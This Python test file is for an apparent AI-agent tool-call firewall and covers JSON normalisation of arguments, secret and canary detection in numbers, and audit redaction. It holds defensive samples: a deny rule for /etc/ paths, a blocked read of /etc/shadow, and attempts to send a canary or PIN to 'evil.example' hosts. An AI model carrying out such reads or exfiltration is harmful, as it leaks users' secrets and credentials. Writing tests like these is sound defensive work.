"""A call's arguments are checked as JSON (textutil.normalised_arguments), and numbers are read by the secret guard.

The library takes Python objects (guard(), Firewall.run, frameworks that
validate the model's JSON with pydantic), and the proxy takes JSON numbers.
Every check reads one JSON-shaped copy; the tool still gets the originals.
"""

from __future__ import annotations

import dataclasses
import datetime
import decimal
import enum
import json
import time
import unittest
import uuid
from collections import OrderedDict, UserString, deque
from pathlib import Path, PurePosixPath, PureWindowsPath
from unittest import mock

from cli_support import TempFolderTest
from support import REF_SUFFIX
from agent_sentinel import BlockedError, Firewall, Policy, textutil
from agent_sentinel.leaks import SecretGuard
from agent_sentinel.textutil import UnscannableError, normalised_arguments, numbers_in
from agent_sentinel.tool_guard import guard

try:
    import pydantic
except ImportError:  # the core is standard library only; these tests need pydantic to be installed
    pydantic = None

CANARY = "sentinel-canary-5d81e2"
PIN = "4485039271"
ACCOUNT_CANARY = "99887766554433"


class Colour(enum.Enum):
    RED = "red"
    NESTED = CANARY


class Level(enum.IntEnum):
    HIGH = 3


@dataclasses.dataclass
class Address:
    street: str
    where: PurePosixPath


@dataclasses.dataclass
class Letter:
    to: Address
    tags: list
    colour: Colour = Colour.RED


def firewall(audit=None, **secrets):
    policy = {"default": "allow", "deny_args": [{"arg": "*", "pattern": r"^/etc/"}],
              "secrets": {"canaries": [CANARY, ACCOUNT_CANARY], "known_values_from_env": ["BANK_PIN"], **secrets}}
    guarded = Firewall(Policy.from_dict(policy), audit)
    guarded.set_secret_environment({"BANK_PIN": PIN})
    return guarded


class TheJsonCopy(unittest.TestCase):
    def test_each_kind_of_value_becomes_what_the_table_says(self):
        when = datetime.datetime(2026, 1, 2, 3, 4, 5)
        value = {
            "path": PurePosixPath("/etc/shadow"), "windows": PureWindowsPath("C:/x/y.txt"), "real": Path("notes"),
            "enum": Colour.RED, "int_enum": Level.HIGH, "letter": Letter(Address("Main St", PurePosixPath("/a")), [1]),
            "uuid": uuid.UUID(int=1), "when": when, "day": when.date(), "time": when.time(),
            "money": decimal.Decimal("12.50"), "tuple": (1, "a"), "set": {"only"}, "frozen": frozenset({2}),
            "deque": deque(["d"]), "ordered": OrderedDict(b=1), "bytes": b"raw", "user": UserString("u"),
            "plain": [True, None, 1.5, -3, "s"],
        }
        self.assertEqual(normalised_arguments(value), {
            "path": "/etc/shadow", "windows": "C:\\x\\y.txt", "real": str(Path("notes")),
            "enum": "red", "int_enum": 3, "letter": {"to": {"street": "Main St", "where": "/a"}, "tags": [1],
                                                     "colour": "red"},
            "uuid": "00000000-0000-0000-0000-000000000001", "when": "2026-01-02 03:04:05", "day": "2026-01-02",
            "time": "03:04:05", "money": "12.50", "tuple": [1, "a"], "set": ["only"], "frozen": [2],
            "deque": ["d"], "ordered": {"b": 1}, "bytes": b"raw", "user": "u",
            "plain": [True, None, 1.5, -3, "s"],
        })

    def test_subclasses_of_text_and_numbers_become_the_plain_types(self):
        class Name(str):
            pass

        class Count(int):
            pass

        copy = normalised_arguments({"n": Name("x"), "c": Count(5), "f": type("F", (float,), {})(1.5)})
        self.assertEqual(copy, {"n": "x", "c": 5, "f": 1.5})
        self.assertEqual([type(item) for item in copy.values()], [str, int, float])

    def test_keys_are_written_as_json_writes_them(self):
        self.assertEqual(normalised_arguments({1: "a", None: "c", 2.5: "d", Colour.RED: "e", b"k": "f"}),
                         {"1": "a", "null": "c", "2.5": "d", "red": "e", "k": "f"})
        self.assertEqual(normalised_arguments({True: "b"}), {"true": "b"})

    def test_two_keys_that_become_one_are_refused(self):
        for value in ({1: "a", "1": "b"}, {Colour.RED: 1, "red": 2}):
            with self.subTest(value=value):
                with self.assertRaises(UnscannableError):
                    normalised_arguments(value)

    def test_the_original_is_not_changed(self):
        original = {"p": PurePosixPath("/a"), "l": [Colour.RED]}
        normalised_arguments(original)
        self.assertEqual(original, {"p": PurePosixPath("/a"), "l": [Colour.RED]})

    def test_anything_else_is_refused_and_a_generator_is_not_used_up(self):
        lines = (line for line in ["never read"])
        for value in (object(), lines, iter([1]), range(3), complex(1, 2), Address, {"x": {"y": object()}}):
            with self.subTest(value=type(value).__name__):
                with self.assertRaises(UnscannableError):
                    normalised_arguments({"value": value})
        self.assertEqual(next(lines), "never read")

    def test_an_object_whose_own_code_fails_is_refused(self):
        class Broken:
            def model_dump(self, mode):
                raise RuntimeError("boom")

        with self.assertRaises(UnscannableError):
            normalised_arguments({"x": Broken()})

    def test_a_container_whose_own_reading_fails_is_refused_not_raised(self):
        from collections.abc import Mapping

        class BrokenMapping(Mapping):
            def __getitem__(self, key):
                raise KeyError(key)

            def __len__(self):
                return 1

            def __iter__(self):
                raise RuntimeError("boom")

        class BrokenList(list):
            def __iter__(self):
                raise RuntimeError("boom")

        @dataclasses.dataclass
        class BrokenField:
            name: str = "x"

            def __getattribute__(self, attribute):
                if attribute == "name":
                    raise RuntimeError("boom")
                return object.__getattribute__(self, attribute)

        class BrokenEnum(enum.Enum):
            ONE = 1

            @property
            def value(self):
                raise RuntimeError("boom")

        for value in (BrokenMapping(), deque_of_broken(), BrokenField(), BrokenEnum.ONE, BrokenList([1])):
            with self.subTest(value=type(value).__name__):
                with self.assertRaises(UnscannableError):
                    normalised_arguments({"x": value})
        decision = firewall().check_call("t", {"x": BrokenMapping()})
        self.assertEqual((decision.allowed, decision.rule), (False, "unscannable"))

    def test_a_value_that_holds_itself_is_refused(self):
        loop = {}
        loop["again"] = loop
        with self.assertRaises(UnscannableError):
            normalised_arguments(loop)

    def test_a_part_that_appears_twice_is_copied_twice(self):
        part = {"a": "x"}
        self.assertEqual(normalised_arguments({"one": part, "two": [part, part]}),
                         {"one": {"a": "x"}, "two": [{"a": "x"}, {"a": "x"}]})

    def test_depth_size_and_number_length_are_bounded(self):
        deep = "x"
        for _ in range(textutil.MAX_ARGUMENT_DEPTH + 5):
            deep = [deep]
        with self.assertRaises(UnscannableError):
            normalised_arguments({"deep": deep})
        with mock.patch.object(textutil, "MAX_ARGUMENT_PARTS", 100):
            with self.assertRaises(UnscannableError):
                normalised_arguments({"many": list(range(200))})
        with self.assertRaises(UnscannableError):
            normalised_arguments({"n": 10 ** 5000})

    def test_a_large_value_is_made_json_quickly(self):
        # 60,000 objects and arrays and 120,000 other parts: quicker than collecting their texts (texts_in).
        value = {"rows": [{"id": n, "name": f"row {n}", "tags": ["a", "b"]} for n in range(30_000)]}
        started = time.perf_counter()
        self.assertEqual(normalised_arguments(value), value)
        self.assertLess(time.perf_counter() - started, 5)


def deque_of_broken():
    class BrokenDeque(deque):
        def __iter__(self):
            raise RuntimeError("boom")

    return BrokenDeque([1])


class NumbersAreRead(unittest.TestCase):
    def test_numbers_in_finds_ints_and_floats_but_never_booleans(self):
        self.assertEqual(sorted(numbers_in({"a": [1, 2.5, True, False, None, "3"], "b": {"c": -4}})),
                         ["-4", "1", "2.5"])

    def test_numbers_are_written_as_json_writes_them(self):
        numbers = [0, -1, 7, 10 ** 40, -(10 ** 4000), 0.1, -0.0, 1e300, 1e-300, 2.5e-7, 123456789.125,
                   float("inf"), float("-inf"), float("nan"), Level.HIGH]
        for number in numbers:
            with self.subTest(number=repr(number)[:20]):
                self.assertEqual(textutil.number_text(number), json.dumps(number))

    def test_a_million_numbers_are_checked_quickly(self):
        guarded = firewall()  # a known value of digits: every number is looked at
        started = time.perf_counter()
        self.assertTrue(guarded.check_call("t", {"values": list(range(1_000_000))}).allowed)
        self.assertLess(time.perf_counter() - started, 10)

    def test_a_numeric_known_value_or_canary_is_found_in_a_number(self):
        guard = SecretGuard(known_values={"PIN": PIN}, canaries=[ACCOUNT_CANARY])
        self.assertEqual([found.kind for found in guard.find_in_numbers([PIN])], ["value of PIN"])
        self.assertEqual([found.kind for found in guard.find_in_numbers(["-" + PIN + ".5"])], ["value of PIN"])
        self.assertEqual([found.kind for found in guard.find_in_numbers(["1" + ACCOUNT_CANARY])], ["canary"])
        self.assertEqual(guard.find_in_numbers([PIN], canaries=False)[0].kind, "value of PIN")
        self.assertEqual(guard.find_in_numbers(["44850", "39271"]), [])  # never across two numbers

    def test_only_values_of_digits_are_looked_for_in_numbers(self):
        # Correction (d) of the review: a value with other characters is never matched against a number.
        guard = SecretGuard(known_values={"RATE": "7364.019283", "WORD": "abcdefgh"})
        self.assertEqual(guard.find_in_numbers(["7364.019283"]), [])

    def test_a_custom_format_of_digits_is_found_in_a_number(self):
        from agent_sentinel.leaks import CustomFormat
        guard = SecretGuard([CustomFormat("card", "4111", "0-9", 12, 12)])
        self.assertEqual([found.kind for found in guard.find_in_numbers(["4111111111111111"])], ["card"])

    def test_numbers_are_read_only_when_something_can_be_found_in_them(self):
        # Round 2 (DET-C2-3): a walk over every number of a large call costs time; it is skipped when no
        # known value, canary or custom format can be spelled by a number.
        from agent_sentinel.leaks import CustomFormat
        self.assertFalse(SecretGuard().reads_numbers)
        self.assertFalse(SecretGuard([CustomFormat("acme", "acme_", "A-Za-z0-9", 20, 40)],
                                     known_values={"WORD": "abcdefgh"}, canaries=[CANARY]).reads_numbers)
        self.assertTrue(SecretGuard(known_values={"PIN": PIN}).reads_numbers)
        self.assertTrue(SecretGuard(canaries=[ACCOUNT_CANARY]).reads_numbers)
        self.assertTrue(SecretGuard([CustomFormat("card", "4111", "0-9", 12, 12)]).reads_numbers)
        block = Firewall(Policy.from_dict({"default": "allow", "secrets": {"in_arguments": "block"}}))
        with mock.patch("agent_sentinel.firewall.numbers_in", wraps=numbers_in) as walked:
            self.assertTrue(block.check_call("t", {"n": int(PIN)}).allowed)
            walked.assert_not_called()
            self.assertFalse(firewall().check_call("t", {"n": int(PIN)}).allowed)
            walked.assert_called_once()

    def test_large_calls_of_objects_and_strings_are_checked_quickly(self):
        block = Firewall(Policy.from_dict({"default": "allow", "secrets": {"in_arguments": "block"}}))
        for name, args in [
            ("small objects", {"a": [{"k": "v"} for _ in range(300_000)]}),
            ("short strings", {"a": ["ab"] * 1_000_000}),
            ("deep arrays", {"a": [json.loads("[" * 200 + "1" + "]" * 200) for _ in range(2_000)]}),
        ]:
            with self.subTest(args=name):
                started = time.perf_counter()
                self.assertTrue(block.check_call("t", args).allowed)
                self.assertLess(time.perf_counter() - started, 10)

    def test_arguments_that_are_json_already_are_not_copied(self):
        value = {"a": [1, 2.5, "x", None, True, {"b": []}]}
        self.assertIs(normalised_arguments(value), value)
        for other in ({"a": (1, 2)}, {"a": PurePosixPath("/x")}, {1: "a"}, {"a": Level.HIGH}):
            with self.subTest(value=other):
                self.assertIsNot(normalised_arguments(other), other)


class TheFirewallChecksTheCopy(TempFolderTest):
    def test_a_canary_in_a_path_an_enum_or_a_dataclass_is_refused(self):
        for args in (
            {"file": PurePosixPath(f"/tmp/{CANARY}")},
            {"file": Path(CANARY)},
            {"colour": Colour.NESTED},
            {"letter": Letter(Address(CANARY, PurePosixPath("/a")), [])},
            {"letter": Letter(Address("Main St", PurePosixPath(f"/srv/{CANARY}")), [])},
        ):
            with self.subTest(args=args):
                decision = firewall().check_call("send", args)
                self.assertFalse(decision.allowed)
                self.assertEqual(decision.rule, "secrets.canaries")

    def test_an_anchored_deny_rule_reads_a_path_without_quotes(self):
        decision = firewall().check_call("read", {"path": PurePosixPath("/etc/shadow")})
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.rule, "deny_args[0]")

    def test_numbers_carrying_a_known_value_or_canary_are_refused(self):
        for args, rule in (
            ({"amount": int(PIN)}, "secrets.known_values_from_env"),
            ({"amount": float(PIN)}, "secrets.known_values_from_env"),
            ({"amount": -int(PIN)}, "secrets.known_values_from_env"),
            ({"order": {"lines": [{"ref": int(ACCOUNT_CANARY)}]}}, "secrets.canaries"),
            ({"ref": int(ACCOUNT_CANARY) * 10 + 7}, "secrets.canaries"),
        ):
            with self.subTest(args=args):
                decision = firewall().check_call("pay", args)
                self.assertFalse(decision.allowed)
                self.assertEqual(decision.rule, rule)
        self.assertTrue(firewall().check_call("pay", {"amount": 448503, "ok": True}).allowed)

    def test_numbers_are_read_with_formats_off_too(self):
        decision = firewall(in_arguments="allow").check_call("pay", {"amount": int(PIN)})
        self.assertFalse(decision.allowed)

    def test_the_audit_record_replaces_a_number_that_carries_a_value(self):
        audit = self.folder / "audit.jsonl"
        firewall(audit).check_call("pay", {"amount": int(PIN), "ref": int(ACCOUNT_CANARY), "count": 3})
        line = audit.read_text(encoding="utf-8")
        self.assertNotIn(PIN, line)
        self.assertNotIn(ACCOUNT_CANARY, line)
        record = json.loads(line)
        self.assertEqual(record["args"]["amount"], "[redacted value of BANK_PIN]")
        self.assertEqual(record["args"]["ref"], "[redacted canary]")
        self.assertEqual(record["args"]["count"], 3)

    def test_find_secrets_reads_numbers(self):
        self.assertTrue(firewall().find_secrets({"action": "accept", "content": {"pin": int(PIN)}}))
        self.assertFalse(firewall().find_secrets({"action": "accept", "content": {"pin": 1234}}))

    def test_arguments_that_cannot_be_made_json_are_refused_even_in_monitor_mode(self):
        audit = self.folder / "audit.jsonl"
        for monitor in (False, True):
            with self.subTest(monitor=monitor):
                guarded = Firewall(Policy.from_dict({"default": "allow"}), audit, monitor=monitor)
                decision = guarded.check_call("send", {"handle": object()})
                self.assertFalse(decision.allowed)
                self.assertEqual(decision.rule, "unscannable")
                self.assertRegex(decision.public_reason, REF_SUFFIX)
                self.assertNotIn("object", decision.public_reason)

    def test_the_tool_gets_the_original_objects(self):
        seen = []
        guarded = Firewall(Policy.from_dict({"default": "allow"}))
        guarded.run("read", {"path": Path("notes.txt"), "colour": Colour.RED},
                    lambda path, colour: seen.append((path, colour)))
        self.assertEqual(seen, [(Path("notes.txt"), Colour.RED)])

    def test_an_approver_and_the_audit_log_see_the_json_copy(self):
        audit = self.folder / "audit.jsonl"
        asked = []
        policy = Policy.from_dict({"default": "ask"})
        guarded = Firewall(policy, audit, approver=lambda tool, args, reason: asked.append(args) or True)
        self.assertTrue(guarded.check_call("read", {"path": PurePosixPath("/srv/a")}).allowed)
        self.assertEqual(asked, [{"path": "/srv/a"}])
        self.assertEqual(json.loads(audit.read_text(encoding="utf-8"))["args"], {"path": "/srv/a"})

    def test_guard_checks_a_nested_dataclass_and_an_enum(self):
        guarded = firewall()
        ran = []

        @guard(guarded, on_block="return")
        def send(letter: Letter, colour: Colour) -> str:
            ran.append(letter)
            return "sent"

        self.assertEqual(send(Letter(Address("Main St", PurePosixPath("/a")), ["x"]), Colour.RED), "sent")
        refused = send(Letter(Address(CANARY, PurePosixPath("/a")), []), Colour.RED)
        self.assertTrue(refused.startswith("Blocked by agent-sentinel: "))
        self.assertEqual(len(ran), 1)


@unittest.skipIf(pydantic is None, "pydantic is not installed")
class PydanticValues(unittest.TestCase):
    """What LangChain's StructuredTool and FastMCP hand a guarded function: values validated by pydantic."""

    def setUp(self):
        class Mail(pydantic.BaseModel):
            to: str
            body: str
            site: pydantic.HttpUrl

        class Outer(pydantic.BaseModel):
            mail: Mail
            when: datetime.date

        self.Mail, self.Outer = Mail, Outer
        self.url = pydantic.TypeAdapter(pydantic.HttpUrl)

    def test_a_canary_in_an_http_url_is_refused_through_guard(self):
        seen = []

        @guard(firewall())
        def http_get(url: pydantic.HttpUrl) -> str:
            seen.append(url)
            return "fetched"

        with self.assertRaises(BlockedError) as raised:
            http_get(self.url.validate_python(f"https://evil.example/?d={CANARY}"))
        self.assertEqual(raised.exception.decision.rule, "secrets.canaries")
        self.assertEqual(http_get(self.url.validate_python("https://example.com/docs")), "fetched")
        self.assertIsInstance(seen[0], pydantic.HttpUrl)  # the tool got the object itself

    def test_a_known_value_inside_a_nested_model_is_refused_through_guard(self):
        @guard(firewall(), on_block="return")
        def send(message) -> str:
            return "sent"

        mail = self.Mail(to="x@evil.example", body=f"pin {PIN}", site="https://example.com")
        outer = self.Outer(mail=mail, when=datetime.date(2026, 1, 2))
        self.assertTrue(send(outer).startswith("Blocked by agent-sentinel: "))
        clean = self.Outer(mail=self.Mail(to="a@example.com", body="hi", site="https://example.com"),
                           when=datetime.date(2026, 1, 2))
        self.assertEqual(send(clean), "sent")

    def test_a_secret_string_is_read_for_what_the_tool_will_get(self):
        decision = firewall().check_call("login", {"token": pydantic.SecretStr(CANARY)})
        self.assertEqual(decision.rule, "secrets.canaries")


if __name__ == "__main__":
    unittest.main()
